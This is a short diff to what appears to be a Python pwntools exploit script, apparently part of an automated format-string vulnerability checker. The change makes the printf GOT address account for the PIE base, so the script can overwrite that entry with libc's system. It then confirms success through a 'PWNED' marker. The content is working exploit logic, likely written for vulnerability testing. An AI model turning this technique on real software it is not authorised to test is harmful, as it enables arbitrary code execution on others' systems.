@@ -32,7 +32,14 @@ for i, tok in enumerate(resp.split(b".")[1:], 1):
         offset = i; break
 if offset is None:
     print("NO_OFFSET"); sys.exit(1)
-libc = io.libc; system = libc.symbols["system"]; printf_got = elf.got["printf"]
+libc = io.libc; system = libc.symbols["system"]
+pie_base = 0
+if elf.pie:
+    import os as _os
+    for path, base in (io.libs() or {}).items():
+        if _os.path.basename(path) == _os.path.basename(name):
+            pie_base = base; break
+printf_got = elf.got["printf"] + pie_base
 MARK = b"BINORACLE_FMT_PWNED"
 for wsz in ("short", "byte"):
     try:
